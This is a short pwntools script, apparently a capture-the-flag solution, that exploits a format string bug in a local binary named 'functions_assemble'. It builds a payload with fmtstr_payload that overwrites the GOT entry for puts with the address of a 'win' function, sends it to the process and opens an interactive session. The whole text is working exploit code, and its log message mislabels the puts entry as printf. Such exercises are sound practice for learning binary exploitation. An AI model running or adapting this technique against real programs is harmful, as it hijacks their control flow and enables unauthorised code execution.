from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload

exe = './functions_assemble'
elf = context.binary = ELF(exe, checksec=False)

win = 0x00000000004011a6
p = process()

info("address to overwrite (elf.got.printf): %#x", elf.got.puts)

payload = fmtstr_payload(6, {elf.got.puts: p64(win)}, write_size='short')  

p.sendline(payload)
p.interactive()